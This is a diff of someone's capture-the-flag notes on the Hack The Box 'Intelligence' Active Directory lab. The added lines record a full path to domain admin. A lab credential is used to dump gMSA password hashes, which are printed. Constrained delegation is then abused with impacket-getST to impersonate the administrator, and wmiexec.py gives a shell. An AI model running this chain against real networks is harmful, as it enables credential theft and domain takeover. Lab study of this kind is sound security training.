@@ -358,7 +358,90 @@ TED.GRAVES   Mr.Teddy
 use bloodhound to view potantial way get domain
 `└─$ bloodhound-python -u TED.GRAVES  -p 'Mr.Teddy' -d intelligence.htb -ns 10.10.10.248 -c All --zip`
 
-upload th zip to bloodhound, get a path, 
+upload th zip to bloodhound, get a path, https://www.hackingarticles.in/readgmsapassword-attack/
 
 `ted -> IT sup group --ReadGMSAPassword--> SVC_INT$ --allowtoDelegate--> DC --CoerceToTGT -> domain`
+we have some ways to fetch the hash, 
+`└─$ python3 gMSADumper.py -u TED.GRAVES -p Mr.Teddy -d intelligence.htb  `      
+```
+Users or groups who can read password for svc_int$:
+ > DC$
+ > itsupport
+svc_int$:::b8159389d3528c4b1079ae461f28eb69
+svc_int$:aes256-cts-hmac-sha1-96:4bd97521fbcdb2ce4b35467ae0957d6deb13e1e98fe36211c7e8325c6e960331
+svc_int$:aes128-cts-hmac-sha1-96:c25458d6aba8dfe5ea48ba421e0fee98
+```
+└─$ impacket-ntlmrelayx -t ldap://10.10.10.248 -debug --dump-gmsa --no-dump --no-acl --no-validate-privs
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
+[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client DCSYNC loaded..
+[+] Protocol Attack DCSYNC loaded..
+[+] Protocol Attack MSSQL loaded..
+[+] Protocol Attack HTTP loaded..
+[+] Protocol Attack HTTPS loaded..
+[+] Protocol Attack SMB loaded..
+[+] Protocol Attack IMAP loaded..
+[+] Protocol Attack IMAPS loaded..
+[+] Protocol Attack RPC loaded..
+[+] Protocol Attack LDAP loaded..
+[+] Protocol Attack LDAPS loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections
+[*] HTTPD(80): Client requested path: /
+[*] HTTPD(80): Client requested path: /
+[*] HTTPD(80): Connection from 127.0.0.1 controlled, attacking target ldap://10.10.10.248
+[*] HTTPD(80): Client requested path: /
+[*] HTTPD(80): Authenticating against ldap://10.10.10.248 as /TED.GRAVES SUCCEED
+[*] Assuming relayed user has privileges to escalate a user via ACL attack
+[*] Attempting to dump gMSA passwords
+[*] Dumping gMSA password requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS
+[*] svc_int$:::b8159389d3528c4b1079ae461f28eb69
+
+AllowedToDelegate
+The constrained delegation primitive allows a principal to authenticate as any user to specific services
+
+`└─$ impacket-getST -dc-ip 10.10.10.248 -impersonate administrator  intelligence.htb/svc_int$ -spn www/dc.intelligence.htb -hashes :b8159389d3528c4b1079ae461f28eb69`
+```
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+```
+use ccache file to login
+`└─$ export KRB5CCNAME=administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache; wmiexec.py -k -no-pass administrator@dc.intelligence.htb`
+```
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+intelligence\administrator
+```
+
+#### lesson learned
+- naming type enum is a point
+- add DNS entry,use dnstool to AD DNS server
+- responsor to fetch all ingress connection
+- AD privi - ReadGMSAPassword and allowtoDelegate
